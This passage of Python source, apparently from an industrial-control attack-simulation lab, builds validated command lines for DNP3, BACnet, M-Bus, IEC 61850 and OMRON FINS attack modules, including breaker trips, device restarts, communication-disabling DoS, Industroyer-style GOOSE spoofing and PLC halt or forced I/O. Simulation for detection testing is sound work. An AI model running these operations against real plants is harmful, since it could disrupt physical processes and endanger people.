                "--method", _nodeid(opts.get("method"), "method NodeId")]
        margs = str(opts.get("args", "")).strip()
        if margs:
            if len(margs) > 512 or "\n" in margs:
                raise ValueError("invalid method args")
            cmd += ["--args", margs]
    elif module == "endpoints":
        pass
    elif module == "history_read":
        cmd += ["--node", _nodeid(opts.get("node"), "NodeId"),
                "--count", str(_mb_int(opts, "count", 1, 1000, 10))]
    else:
        cmd += ["--node", _nodeid(opts.get("node"), "NodeId")]
        if module == "write":
            dtype = str(opts.get("dtype", "bool"))
            if dtype not in _OPC_WRITE:
                raise ValueError("write type invalid")
            cmd += ["--dtype", dtype, "--value", str(opts.get("value", "0"))]
    return cmd


# ── DNP3 (IEEE 1815) module menu ─────────────────────────────────────────────
# No Metasploit module / no library; raw framing. Comprehensive command coverage:
# read (all poll targets), CROB binary control, analog-output setpoint, WRITE
# (clear restart IIN), and any application function code. Driven by common/dnp3_console.py.
DNP3_CONSOLE = os.path.join(SIM_DIR, "common", "dnp3_console.py")
_DNP_CONN = [{"name": "master", "label": "Master addr", "type": "int", "default": 100},
             {"name": "outstation", "label": "Outstation addr", "type": "int", "default": 1}]
_DNP_READ = ["class0", "class1", "class2", "class3", "binary_inputs", "analog_inputs",
             "counters", "binary_outputs", "analog_outputs"]
_DNP_CROB = ["LATCH_ON", "LATCH_OFF", "PULSE_ON", "PULSE_OFF", "TRIP", "CLOSE", "NUL"]
_DNP_AOVAR = ["int32", "int16", "float", "double"]
_DNP_OPMODE = ["direct_operate", "select_operate", "direct_operate_nr"]
_DNP_FUNCS = ["cold_restart", "warm_restart", "delay_measure", "record_current_time",
              "initialize_data", "save_config", "immed_freeze", "immed_freeze_nr",
              "freeze_clear", "freeze_clear_nr", "enable_unsolicited", "disable_unsolicited"]
_DNP_FILE_OPS = ["open_read", "open_write", "open_append", "get_file_info", "delete_file",
                 "close_file", "abort_file", "activate_config"]
_DNP_FILE_NAMED = ["open_read", "open_write", "open_append", "get_file_info", "delete_file"]
_DNP_APP_OPS = ["initialize_appl", "start_appl", "stop_appl"]
_DNP_ASSIGN_GROUPS = ["binary_inputs", "double_bit", "counters", "frozen_counters",
                      "analog_inputs", "binary_outputs", "analog_outputs"]
_DNP_SA_VARS = ["challenge", "reply", "aggressive_request", "error"]
DNP3_MODULES = {
    "read": {
        "label": "read - FC1 integrity/class poll or object group",
        "fields": _DNP_CONN + [{"name": "read_target", "label": "Read target", "type": "select",
                                "default": "class0", "options": _DNP_READ}],
    },
    "operate_binary": {
        "label": "operate_binary - CROB control (breaker / valve / pump)",
        "fields": _DNP_CONN + [
            {"name": "index", "label": "Index", "type": "int", "default": 0},
            {"name": "control", "label": "Control", "type": "select", "default": "LATCH_ON", "options": _DNP_CROB},
            {"name": "op_mode", "label": "Mode", "type": "select", "default": "direct_operate", "options": _DNP_OPMODE},
        ],
    },
    "operate_analog": {
        "label": "operate_analog - analog-output setpoint (write what where)",
        "fields": _DNP_CONN + [
            {"name": "index", "label": "Index", "type": "int", "default": 0},
            {"name": "value", "label": "Value", "type": "text", "default": "0"},
            {"name": "ao_var", "label": "Variation", "type": "select", "default": "float", "options": _DNP_AOVAR},
            {"name": "op_mode", "label": "Mode", "type": "select", "default": "direct_operate", "options": _DNP_OPMODE},
        ],
    },
    "write": {"label": "write - FC2 clear the outstation restart IIN bit", "fields": list(_DNP_CONN)},
    "function": {
        "label": "function - any application function code",
        "fields": _DNP_CONN + [
            {"name": "function", "label": "Function", "type": "select", "default": "cold_restart", "options": _DNP_FUNCS},
            {"name": "classes", "label": "Classes", "type": "text", "default": "1,2,3",
             "showForField": "function", "showFor": ["enable_unsolicited", "disable_unsolicited"],
             "help": "unsolicited classes 1,2,3"},
        ],
    },
    "file": {
        "label": "file - FC25-31 file transfer (group 70)",
        "fields": _DNP_CONN + [
            {"name": "file_op", "label": "Operation", "type": "select", "default": "open_read", "options": _DNP_FILE_OPS},
            {"name": "filename", "label": "Filename", "type": "text", "default": "/CONFIG.XML",
             "showForField": "file_op", "showFor": _DNP_FILE_NAMED},
            {"name": "handle", "label": "File handle", "type": "int", "default": 1,
             "showForField": "file_op", "showFor": ["close_file", "abort_file"]},
        ],
    },
    "app_control": {
        "label": "app_control - FC16-18 init/start/stop application (group 90)",
        "fields": _DNP_CONN + [
            {"name": "app_op", "label": "Operation", "type": "select", "default": "start_appl", "options": _DNP_APP_OPS},
            {"name": "app_name", "label": "App name", "type": "text", "default": "APP"},
        ],
    },
    "assign_class": {
        "label": "assign_class - FC22 assign points to a class",
        "fields": _DNP_CONN + [
            {"name": "assign_group", "label": "Data group", "type": "select",
             "default": "binary_inputs", "options": _DNP_ASSIGN_GROUPS},
            {"name": "assign_class", "label": "Class", "type": "int", "default": 1, "help": "0-3"},
        ],
    },
    "secure_auth": {
        "label": "secure_auth - group 120 SA object (unkeyed, detection coverage)",
        "fields": _DNP_CONN + [
            {"name": "sa_var", "label": "SA object", "type": "select", "default": "challenge", "options": _DNP_SA_VARS},
        ],
    },
}


def build_dnp3_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate a DNP3 module request and return the dnp3_console.py argv."""
    if module not in DNP3_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, DNP3_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--master", str(_mb_int(opts, "master", 0, 65535, 100)),
           "--outstation", str(_mb_int(opts, "outstation", 0, 65535, 1)),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module == "read":
        rt = str(opts.get("read_target", "class0"))
        if rt not in _DNP_READ:
            raise ValueError("read target invalid")
        cmd += ["--read-target", rt]
    elif module in ("operate_binary", "operate_analog"):
        om = str(opts.get("op_mode", "direct_operate"))
        if om not in _DNP_OPMODE:
            raise ValueError("mode invalid")
        cmd += ["--index", str(_mb_int(opts, "index", 0, 0xFFFF, 0)), "--op-mode", om]
        if module == "operate_binary":
            ctl = str(opts.get("control", "LATCH_ON"))
            if ctl not in _DNP_CROB:
                raise ValueError("control invalid")
            cmd += ["--control", ctl]
        else:
            try:
                float(opts.get("value", "0"))
            except (TypeError, ValueError):
                raise ValueError("value must be a number")
            av = str(opts.get("ao_var", "float"))
            if av not in _DNP_AOVAR:
                raise ValueError("variation invalid")
            cmd += ["--value", str(opts.get("value", "0")), "--ao-var", av]
    elif module == "function":
        fn = str(opts.get("function", "cold_restart"))
        if fn not in _DNP_FUNCS:
            raise ValueError("function invalid")
        cmd += ["--function", fn]
        if fn in ("enable_unsolicited", "disable_unsolicited"):
            classes = str(opts.get("classes", "1,2,3"))
            if any(c.strip() not in ("1", "2", "3", "") for c in classes.split(",")):
                raise ValueError("classes must be from 1,2,3")
            cmd += ["--classes", classes]
    elif module == "file":
        op = str(opts.get("file_op", "open_read"))
        if op not in _DNP_FILE_OPS:
            raise ValueError("file op invalid")
        fn = str(opts.get("filename", "/CONFIG.XML"))
        if len(fn) > 250 or "\n" in fn:
            raise ValueError("invalid filename")
        cmd += ["--file-op", op, "--filename", fn, "--handle", str(_mb_int(opts, "handle", 0, 0xFFFFFFFF, 1))]
    elif module == "app_control":
        ao = str(opts.get("app_op", "start_appl"))
        if ao not in _DNP_APP_OPS:
            raise ValueError("app op invalid")
        an = str(opts.get("app_name", "APP"))
        if len(an) > 250 or "\n" in an:
            raise ValueError("invalid app name")
        cmd += ["--app-op", ao, "--app-name", an]
    elif module == "assign_class":
        ag = str(opts.get("assign_group", "binary_inputs"))
        if ag not in _DNP_ASSIGN_GROUPS:
            raise ValueError("assign group invalid")
        cmd += ["--assign-group", ag, "--assign-class", str(_mb_int(opts, "assign_class", 0, 3, 1))]
    elif module == "secure_auth":
        sv = str(opts.get("sa_var", "challenge"))
        if sv not in _DNP_SA_VARS:
            raise ValueError("SA object invalid")
        cmd += ["--sa-var", sv]
    return cmd


# ── BACnet/IP module menu ────────────────────────────────────────────────────
# No Metasploit module; the "attacks" are BACnet's real services. Write-what-where =
# WriteProperty a typed value into a chosen object's property at a chosen priority.
# Driven by common/bacnet_console.py (bacpypes3).
BACNET_CONSOLE = os.path.join(SIM_DIR, "common", "bacnet_console.py")
_BAC_CONN = [{"name": "reg", "label": "Registration", "type": "select", "default": "foreign",
              "options": ["foreign", "local"]},
             {"name": "device_instance", "label": "Our device id", "type": "int", "default": 599}]
_BAC_OBJT = ["analog-input", "analog-output", "analog-value", "binary-input", "binary-output",
             "binary-value", "multi-state-input", "multi-state-output", "multi-state-value", "device"]
_BAC_DTYPES = ["real", "unsigned", "boolean", "null"]
_bac_obj_fields = [{"name": "obj_type", "label": "Object type", "type": "select",
                    "default": "analog-input", "options": _BAC_OBJT},
                   {"name": "instance", "label": "Instance", "type": "int", "default": 0}]
BACNET_MODULES = {
    "who_is": {
        "label": "who_is - device discovery (WhoIs -> I-Am)",
        "fields": _BAC_CONN + [{"name": "low", "label": "Low limit", "type": "int", "default": 0},
                               {"name": "high", "label": "High limit", "type": "int", "default": 0}],
    },
    "who_has": {
        "label": "who_has - find who has an object (by name, or type+instance)",
        "fields": _BAC_CONN + [{"name": "object_name", "label": "Object name", "type": "text",
                                "default": "", "help": "blank = use type+instance"}] + _bac_obj_fields,
    },
    "read": {
        "label": "read - ReadProperty",
        "fields": _BAC_CONN + _bac_obj_fields + [
            {"name": "prop", "label": "Property", "type": "text", "default": "present-value"},
            {"name": "array_index", "label": "Array idx", "type": "int", "default": -1, "help": "-1 = none"}],
    },
    "read_multiple": {
        "label": "read_multiple - ReadPropertyMultiple",
        "fields": _BAC_CONN + _bac_obj_fields + [
            {"name": "props", "label": "Properties", "type": "text",
             "default": "present-value,object-name,units,status-flags"}],
    },
    "write": {
        "label": "write - WriteProperty (write what where)",
        "fields": _BAC_CONN + [
            {"name": "obj_type", "label": "Object type", "type": "select", "default": "analog-output", "options": _BAC_OBJT},
            {"name": "instance", "label": "Instance", "type": "int", "default": 0},
            {"name": "prop", "label": "Property", "type": "text", "default": "present-value"},
            {"name": "dtype", "label": "Type", "type": "select", "default": "real", "options": _BAC_DTYPES},
            {"name": "value", "label": "Value", "type": "text", "default": "0",
             "showForField": "dtype", "showFor": ["real", "unsigned", "boolean"]},
            {"name": "priority", "label": "Priority", "type": "int", "default": 0, "help": "1-16, 0=none"},
            {"name": "prime", "label": "Prime", "type": "select", "default": "no", "options": ["no", "yes"],
             "help": "write a distinct value first (DDC change-callback)"}],
    },
    "device_info": {
        "label": "device_info - read device identity (recon)",
        "fields": _BAC_CONN + [{"name": "instance", "label": "Device instance", "type": "int", "default": 1000}],
    },
    "reinitialize": {
        "label": "reinitialize - warm/cold restart the device (T0816)",
        "fields": _BAC_CONN + [
            {"name": "reinit_state", "label": "State", "type": "select", "default": "warmstart",
             "options": ["warmstart", "coldstart"]},
            {"name": "password", "label": "Password", "type": "text", "default": "", "help": "if required"}],
    },
    "device_comm_control": {
        "label": "device_comm_control - disable/enable BACnet comms (DoS)",
        "fields": _BAC_CONN + [
            {"name": "dcc_state", "label": "State", "type": "select", "default": "disable",
             "options": ["disable", "enable"]},
            {"name": "dcc_minutes", "label": "Minutes", "type": "int", "default": 0, "help": "0 = indefinite"},
            {"name": "password", "label": "Password", "type": "text", "default": ""}],
    },
    "time_sync": {
        "label": "time_sync - set the device clock (TimeSynchronization)",
        "fields": _BAC_CONN + [
            {"name": "value", "label": "Datetime", "type": "text", "default": "2020-01-01T00:00:00", "help": "ISO 8601"},
            {"name": "utc", "label": "UTC", "type": "select", "default": "no", "options": ["no", "yes"]}],
    },
    "subscribe_cov": {
        "label": "subscribe_cov - stream a point's change-of-value (monitor)",
        "fields": _BAC_CONN + [
            {"name": "obj_type", "label": "Object type", "type": "select",
             "default": "analog-input", "options": _BAC_OBJT},
            {"name": "instance", "label": "Instance", "type": "int", "default": 0}],
    },
}


def _bac_obj(opts):
    ot = str(opts.get("obj_type", "analog-input"))
    if ot not in _BAC_OBJT:
        raise ValueError("object type invalid")
    return ["--obj-type", ot, "--instance", str(_mb_int(opts, "instance", 0, 4194303, 0))]


def _bac_prop(opts):
    pr = str(opts.get("prop", "present-value")).strip()
    if not pr or len(pr) > 64 or not all(c.isalnum() or c in "-_" for c in pr):
        raise ValueError("invalid property")
    return pr


def build_bacnet_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate a BACnet module request and return the bacnet_console.py argv."""
    if module not in BACNET_MODULES:
        raise ValueError("unknown module")
    reg = str(opts.get("reg", "foreign"))
    if reg not in ("foreign", "local"):
        raise ValueError("registration invalid")
    cmd = [PYTHON, BACNET_CONSOLE, "-m", module, "-t", ip, "--reg", reg,
           "--device-instance", str(_mb_int(opts, "device_instance", 0, 4194302, 599)),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module == "who_is":
        cmd += ["--low", str(_mb_int(opts, "low", 0, 4194303, 0)),
                "--high", str(_mb_int(opts, "high", 0, 4194303, 0))]
    elif module == "who_has":
        name = str(opts.get("object_name", "")).strip()
        if len(name) > 128 or "\n" in name:
            raise ValueError("invalid object name")
        cmd += _bac_obj(opts)
        if name:
            cmd += ["--object-name", name]
    elif module == "read":
        cmd += _bac_obj(opts) + ["--prop", _bac_prop(opts),
                                 "--array-index", str(_mb_int(opts, "array_index", -1, 0xFFFF, -1))]
    elif module == "read_multiple":
        props = str(opts.get("props", "present-value")).strip()
        if not props or len(props) > 256 or "\n" in props:
            raise ValueError("invalid properties")
        cmd += _bac_obj(opts) + ["--props", props]
    elif module == "write":
        dtype = str(opts.get("dtype", "real"))
        if dtype not in _BAC_DTYPES:
            raise ValueError("dtype invalid")
        cmd += _bac_obj(opts) + ["--prop", _bac_prop(opts), "--dtype", dtype,
                                 "--priority", str(_mb_int(opts, "priority", 0, 16, 0))]
        if dtype != "null":
            cmd += ["--value", str(opts.get("value", "0"))]
        if str(opts.get("prime", "no")) == "yes":
            cmd += ["--prime"]
    elif module == "device_info":
        cmd += ["--instance", str(_mb_int(opts, "instance", 0, 4194303, 1000))]
    elif module == "reinitialize":
        st = str(opts.get("reinit_state", "warmstart"))
        if st not in ("warmstart", "coldstart"):
            raise ValueError("reinit state invalid")
        cmd += ["--reinit-state", st]
        pw = str(opts.get("password", ""))
        if pw:
            cmd += ["--password", pw]
    elif module == "device_comm_control":
        st = str(opts.get("dcc_state", "disable"))
        if st not in ("enable", "disable"):
            raise ValueError("dcc state invalid")
        cmd += ["--dcc-state", st, "--dcc-minutes", str(_mb_int(opts, "dcc_minutes", 0, 0xFFFF, 0))]
        pw = str(opts.get("password", ""))
        if pw:
            cmd += ["--password", pw]
    elif module == "time_sync":
        cmd += ["--value", str(opts.get("value", "2020-01-01T00:00:00"))]
        if str(opts.get("utc", "no")) == "yes":
            cmd += ["--utc"]
    elif module == "subscribe_cov":
        cmd += _bac_obj(opts)
    return cmd


# ── M-Bus (EN 13757) module menu ─────────────────────────────────────────────
# Read-only client in the repo; write/control frames are hand-framed in the console.
# Write-what-where = SND_UD to a chosen primary address (incl. set primary address /
# baud rate / arbitrary user data). Driven by common/mbus_console.py.
MBUS_CONSOLE = os.path.join(SIM_DIR, "common", "mbus_console.py")
_MBUS_ADDR = {"name": "address", "label": "Primary addr", "type": "int", "default": 1}
_MBUS_BAUDS = ["300", "600", "1200", "2400", "4800", "9600", "19200", "38400"]
MBUS_MODULES = {
    "read": {"label": "read - REQ_UD2 read meter records", "fields": [dict(_MBUS_ADDR)]},
    "scan": {"label": "scan - probe primary addresses",
             "fields": [{"name": "addr_from", "label": "From", "type": "int", "default": 0},
                        {"name": "addr_to", "label": "To", "type": "int", "default": 20}]},
    "init": {"label": "init - SND_NKE link reset", "fields": [dict(_MBUS_ADDR)]},
    "req_ud1": {"label": "req_ud1 - REQ_UD1 alarm data", "fields": [dict(_MBUS_ADDR)]},
    "app_reset": {"label": "app_reset - SND_UD CI=0x50 application reset",
                  "fields": [dict(_MBUS_ADDR),
                             {"name": "subcode", "label": "Subcode hex", "type": "text", "default": "",
                              "help": "optional"}]},
    "set_address": {"label": "set_address - write a new primary address (write what where)",
                    "fields": [{"name": "address", "label": "Current addr", "type": "int", "default": 1},
                               {"name": "new_address", "label": "New addr", "type": "int", "default": 5}]},
    "set_baudrate": {"label": "set_baudrate - change slave baud rate",
                     "fields": [dict(_MBUS_ADDR),
                                {"name": "baud", "label": "Baud", "type": "select",
                                 "default": "9600", "options": _MBUS_BAUDS}]},
    "send_ud": {"label": "send_ud - send arbitrary user data (generic write)",
                "fields": [dict(_MBUS_ADDR),
                           {"name": "ci", "label": "CI byte", "type": "text", "default": "0x51"},
                           {"name": "data", "label": "Data (hex)", "type": "text", "default": "ffffffff"}]},
    "select_secondary": {"label": "select_secondary - select a slave by secondary address (CI 0x52)",
                         "fields": [{"name": "sec_id", "label": "Secondary id", "type": "text", "default": "FFFFFFFF",
                                     "help": "8 hex/BCD digits, F = wildcard"},
                                    {"name": "manufacturer", "label": "Manufacturer", "type": "text", "default": "FFFF"},
                                    {"name": "version", "label": "Version", "type": "text", "default": "FF"},
                                    {"name": "medium", "label": "Medium", "type": "text", "default": "FF"}]},
    "broadcast": {"label": "broadcast - SND_NKE to 0xFF (broadcast reset)", "fields": []},
}
_MBUS_ADDR_MODS = ("read", "init", "req_ud1", "app_reset", "set_address", "set_baudrate", "send_ud")


def build_mbus_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an M-Bus module request and return the mbus_console.py argv."""
    if module not in MBUS_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, MBUS_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in _MBUS_ADDR_MODS:
        cmd += ["--address", str(_mb_int(opts, "address", 0, 255, 1))]
    if module == "scan":
        lo = _mb_int(opts, "addr_from", 0, 250, 0)
        hi = _mb_int(opts, "addr_to", lo, 250, 20)
        cmd += ["--addr-from", str(lo), "--addr-to", str(hi)]
    elif module == "app_reset":
        sub = str(opts.get("subcode", "")).strip().replace("0x", "")
        if len(sub) > 64 or any(c not in "0123456789abcdefABCDEF" for c in sub):
            raise ValueError("subcode must be hex")
        if sub:
            cmd += ["--subcode", sub]
    elif module == "set_address":
        cmd += ["--new-address", str(_mb_int(opts, "new_address", 0, 250, 5))]
    elif module == "set_baudrate":
        baud = str(opts.get("baud", "9600"))
        if baud not in _MBUS_BAUDS:
            raise ValueError("baud invalid")
        cmd += ["--baud", baud]
    elif module == "send_ud":
        ci = str(opts.get("ci", "0x51")).strip()
        try:
            civ = int(ci, 16) if ci.lower().startswith("0x") else int(ci)
        except ValueError:
            raise ValueError("CI must be a byte")
        if not 0 <= civ <= 255:
            raise ValueError("CI must be 0-255")
        data = str(opts.get("data", "")).strip()
        if len(data) > 512 or any(c not in "0123456789abcdefABCDEF " for c in data):
            raise ValueError("data must be hex")
        cmd += ["--ci", ci, "--data", data]
    elif module == "select_secondary":
        def _hexw(name, n):
            v = str(opts.get(name, "")).strip().replace("0x", "")
            if len(v) != n or any(c not in "0123456789abcdefABCDEF" for c in v):
                raise ValueError("%s must be %d hex digits" % (name, n))
            return v
        cmd += ["--sec-id", _hexw("sec_id", 8), "--manufacturer", _hexw("manufacturer", 4),
                "--version", _hexw("version", 2), "--medium", _hexw("medium", 2)]
    return cmd


# ── IEC 61850 module menu (MMS / GOOSE / Sampled Values flavors) ─────────────
# MMS = JSON/TCP client-server (read/write data attrs). GOOSE = TCP subscribe + emulated
# trip, plus REAL L2 GOOSE frames (0x88B8, Industroyer technique). SV = REAL L2 frames
# (0x88BA). Driven by common/iec61850_console.py (raw L2 needs CAP_NET_RAW).
IEC61850_CONSOLE = os.path.join(SIM_DIR, "common", "iec61850_console.py")
_I61_VTYPES = ["bool", "float", "int", "string"]
IEC61850_MODULES = {
    "mms_read": {"label": "mms_read - MMS ReadRequest a data reference",
                 "fields": [{"name": "reference", "label": "Reference", "type": "text",
                             "default": "all", "help": "'all' or a data ref"}]},
    "mms_write": {"label": "mms_write - MMS WriteRequest (write what where)",
                  "fields": [{"name": "reference", "label": "Reference", "type": "text",
                              "default": "WaterTankLD/CSWI1.Pos3.Oper.ctlVal"},
                             {"name": "vtype", "label": "Type", "type": "select",
                              "default": "bool", "options": _I61_VTYPES},
                             {"name": "value", "label": "Value", "type": "text", "default": "false"}]},
    "mms_get_model": {"label": "mms_get_model - enumerate logical device / nodes / attrs", "fields": []},
    "goose_subscribe": {"label": "goose_subscribe - read the TCP GOOSE publisher stream",
                        "fields": [{"name": "count", "label": "Messages", "type": "int", "default": 3}]},
    "goose_trip": {"label": "goose_trip - inject emulated goose-trip (breakers open)", "fields": []},
    "goose_publish": {"label": "goose_publish - REAL L2 GOOSE frame (0x88B8, Industroyer)",
                      "fields": [{"name": "iface", "label": "Interface", "type": "text", "default": "eth0"},
                                 {"name": "go_id", "label": "goID", "type": "text", "default": "AttackTrip"},
                                 {"name": "st_num", "label": "stNum", "type": "int", "default": 1},
                                 {"name": "data", "label": "Data (bool)", "type": "select",
                                  "default": "true", "options": ["true", "false"]},
                                 {"name": "dst_mac", "label": "Dst MAC", "type": "text", "default": "01:0c:cd:01:00:01"},
                                 {"name": "src_mac", "label": "Src MAC (spoof)", "type": "text", "default": ""}]},
    "sv_publish": {"label": "sv_publish - REAL L2 Sampled-Values frame (0x88BA)",
                   "fields": [{"name": "iface", "label": "Interface", "type": "text", "default": "eth0"},
                              {"name": "sv_id", "label": "svID", "type": "text", "default": "AttackSV"},
                              {"name": "smp_cnt", "label": "smpCnt", "type": "int", "default": 0},
                              {"name": "samples", "label": "Samples", "type": "text", "default": "100,200,300,400"},
                              {"name": "sv_dst_mac", "label": "Dst MAC", "type": "text", "default": "01:0c:cd:04:00:01"}]},
    "goose_spoof": {"label": "goose_spoof - GOOSE takeover burst (high stNum override, Industroyer2)",
                    "fields": [{"name": "iface", "label": "Interface", "type": "text", "default": "eth0"},
                               {"name": "go_id", "label": "goID", "type": "text", "default": "AttackTrip"},
                               {"name": "st_num", "label": "stNum (high)", "type": "int", "default": 1000},
                               {"name": "data", "label": "Data (bools)", "type": "text", "default": "true",
                                "help": "one or more, e.g. true or true,false"},
                               {"name": "burst", "label": "Burst frames", "type": "int", "default": 20},
                               {"name": "dst_mac", "label": "Dst MAC", "type": "text", "default": "01:0c:cd:01:00:01"},
                               {"name": "src_mac", "label": "Src MAC (spoof)", "type": "text", "default": ""}]},
    "sv_spoof": {"label": "sv_spoof - Sampled-Values injection burst",
                 "fields": [{"name": "iface", "label": "Interface", "type": "text", "default": "eth0"},
                            {"name": "sv_id", "label": "svID", "type": "text", "default": "AttackSV"},
                            {"name": "smp_cnt", "label": "smpCnt", "type": "int", "default": 0},
                            {"name": "samples", "label": "Samples", "type": "text", "default": "100,200,300,400"},
                            {"name": "burst", "label": "Burst frames", "type": "int", "default": 20},
                            {"name": "sv_dst_mac", "label": "Dst MAC", "type": "text", "default": "01:0c:cd:04:00:01"}]},
}


def _i61_mac(s):
    parts = str(s).strip().split(":")
    if len(parts) != 6 or not all(1 <= len(x) <= 2 and all(c in "0123456789abcdefABCDEF" for c in x) for x in parts):
        raise ValueError("invalid MAC")
    return str(s).strip()


def _i61_token(s, what):
    s = str(s).strip()
    if not s or len(s) > 64 or not all(c.isalnum() or c in "._$-/" for c in s):
        raise ValueError("invalid %s" % what)
    return s


def _i61_iface(opts):
    iface = str(opts.get("iface", "eth0")).strip()
    if not iface or len(iface) > 16 or not all(c.isalnum() or c in "._-" for c in iface):
        raise ValueError("invalid interface")
    return ["--iface", iface]


def _i61_data_bools(s):
    parts = [x.strip().lower() for x in str(s).split(",") if x.strip()]
    if not parts or any(p not in ("true", "false", "1", "0", "on", "off") for p in parts):
        raise ValueError("data must be booleans, e.g. true or true,false")
    return ",".join("true" if p in ("true", "1", "on") else "false" for p in parts)


def build_iec61850_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an IEC 61850 module request and return the iec61850_console.py argv."""
    if module not in IEC61850_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, IEC61850_CONSOLE, "-m", module, "-t", ip, "--mms-port", str(port),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in ("mms_read", "mms_write"):
        ref = str(opts.get("reference", "all")).strip()
        if not ref or len(ref) > 128 or not all(c.isalnum() or c in "/._$-" for c in ref):
            raise ValueError("invalid reference")
        cmd += ["--reference", ref]
        if module == "mms_write":
            vt = str(opts.get("vtype", "bool"))
            if vt not in _I61_VTYPES:
                raise ValueError("vtype invalid")
            cmd += ["--vtype", vt, "--value", str(opts.get("value", "false"))]
    elif module == "goose_subscribe":
        cmd += ["--count", str(_mb_int(opts, "count", 1, 50, 3))]
    elif module == "goose_publish":
        cmd += _i61_iface(opts) + [
            "--go-id", _i61_token(opts.get("go_id", "AttackTrip"), "goID"),
            "--st-num", str(_mb_int(opts, "st_num", 0, 0xFFFFFFFF, 1)),
            "--data", "true" if str(opts.get("data", "true")) == "true" else "false",
            "--dst-mac", _i61_mac(opts.get("dst_mac", "01:0c:cd:01:00:01"))]
        sm = str(opts.get("src_mac", "")).strip()
        if sm:
            cmd += ["--src-mac", _i61_mac(sm)]
    elif module == "sv_publish":
        try:
            samples = [int(x) for x in str(opts.get("samples", "")).split(",") if x.strip() != ""]
        except ValueError:
            raise ValueError("samples must be comma ints")
        if not samples or len(samples) > 32:
            raise ValueError("1-32 samples")
        cmd += _i61_iface(opts) + [
            "--sv-id", _i61_token(opts.get("sv_id", "AttackSV"), "svID"),
            "--smp-cnt", str(_mb_int(opts, "smp_cnt", 0, 0xFFFF, 0)),
            "--samples", ",".join(str(v) for v in samples),
            "--sv-dst-mac", _i61_mac(opts.get("sv_dst_mac", "01:0c:cd:04:00:01"))]
    elif module == "goose_spoof":
        cmd += _i61_iface(opts) + [
            "--go-id", _i61_token(opts.get("go_id", "AttackTrip"), "goID"),
            "--st-num", str(_mb_int(opts, "st_num", 0, 0xFFFFFFFF, 1000)),
            "--data", _i61_data_bools(opts.get("data", "true")),
            "--burst", str(_mb_int(opts, "burst", 1, 1000, 20)),
            "--dst-mac", _i61_mac(opts.get("dst_mac", "01:0c:cd:01:00:01"))]
        sm = str(opts.get("src_mac", "")).strip()
        if sm:
            cmd += ["--src-mac", _i61_mac(sm)]
    elif module == "sv_spoof":
        try:
            samples = [int(x) for x in str(opts.get("samples", "")).split(",") if x.strip() != ""]
        except ValueError:
            raise ValueError("samples must be comma ints")
        if not samples or len(samples) > 32:
            raise ValueError("1-32 samples")
        cmd += _i61_iface(opts) + [
            "--sv-id", _i61_token(opts.get("sv_id", "AttackSV"), "svID"),
            "--smp-cnt", str(_mb_int(opts, "smp_cnt", 0, 0xFFFF, 0)),
            "--samples", ",".join(str(v) for v in samples),
            "--burst", str(_mb_int(opts, "burst", 1, 4000, 20)),
            "--sv-dst-mac", _i61_mac(opts.get("sv_dst_mac", "01:0c:cd:04:00:01"))]
    return cmd


# ── OMRON FINS/TCP module menu ───────────────────────────────────────────────
# No Metasploit module / no library; raw FINS/TCP framing. Write-what-where = write
# words to a chosen memory area (DM/CIO/WR/HR/AR). Driven by common/fins_console.py.
FINS_CONSOLE = os.path.join(SIM_DIR, "common", "fins_console.py")
_FINS_AREAS = ["DM", "CIO", "WR", "HR", "AR"]
FINS_MODULES = {
    "read": {"label": "read - MEMORY_AREA_READ",
             "fields": [{"name": "area", "label": "Area", "type": "select", "default": "DM", "options": _FINS_AREAS},
                        {"name": "address", "label": "Address", "type": "int", "default": 100},
                        {"name": "count", "label": "Count", "type": "int", "default": 6},
                        {"name": "decode", "label": "Decode", "type": "select", "default": "word",
                         "options": ["word", "hex", "float"]}]},
    "write": {"label": "write - MEMORY_AREA_WRITE (write what where)",
              "fields": [{"name": "area", "label": "Area", "type": "select", "default": "DM", "options": _FINS_AREAS},
                         {"name": "address", "label": "Address", "type": "int", "default": 200},
                         {"name": "values", "label": "Words", "type": "text", "default": "1234",
                          "help": "comma 0-65535"}]},
    "fill": {"label": "fill - MEMORY_AREA_FILL",
             "fields": [{"name": "area", "label": "Area", "type": "select", "default": "DM", "options": _FINS_AREAS},
                        {"name": "address", "label": "Address", "type": "int", "default": 210},
                        {"name": "count", "label": "Count", "type": "int", "default": 4},
                        {"name": "fill_value", "label": "Fill value", "type": "int", "default": 0}]},
    "transfer": {"label": "transfer - MEMORY_AREA_TRANSFER",
                 "fields": [{"name": "area", "label": "Src area", "type": "select", "default": "DM", "options": _FINS_AREAS},
                            {"name": "address", "label": "Src addr", "type": "int", "default": 200},
                            {"name": "dst_area", "label": "Dst area", "type": "select", "default": "DM", "options": _FINS_AREAS},
                            {"name": "dst_address", "label": "Dst addr", "type": "int", "default": 220},
                            {"name": "count", "label": "Count", "type": "int", "default": 2}]},
    "run": {"label": "run - set MONITOR/RUN mode",
            "fields": [{"name": "run_mode", "label": "Mode", "type": "select", "default": "monitor",
                        "options": ["monitor", "run"]}]},
    "stop": {"label": "stop - set PROGRAM mode (halt CPU)", "fields": []},
    "cpu_info": {"label": "cpu_info - CONTROLLER_DATA_READ (model/version)", "fields": []},
    "cpu_status": {"label": "cpu_status - CONTROLLER_STATUS_READ (run mode/error)", "fields": []},
    "clock_read": {"label": "clock_read - CLOCK_READ", "fields": []},
    "clock_write": {"label": "clock_write - CLOCK_WRITE (set to now)", "fields": []},
    "error_clear": {"label": "error_clear - ERROR_CLEAR", "fields": []},
    "force": {"label": "force - FORCED SET/RESET a bit (force I/O, bypass logic)",
              "fields": [{"name": "area", "label": "Area", "type": "select", "default": "CIO",
                          "options": ["CIO", "WR", "HR", "AR"]},
                         {"name": "address", "label": "Word", "type": "int", "default": 0},
                         {"name": "bit", "label": "Bit", "type": "int", "default": 0, "help": "0-15"},
                         {"name": "force_state", "label": "State", "type": "select", "default": "set",
                          "options": ["set", "reset"]}]},
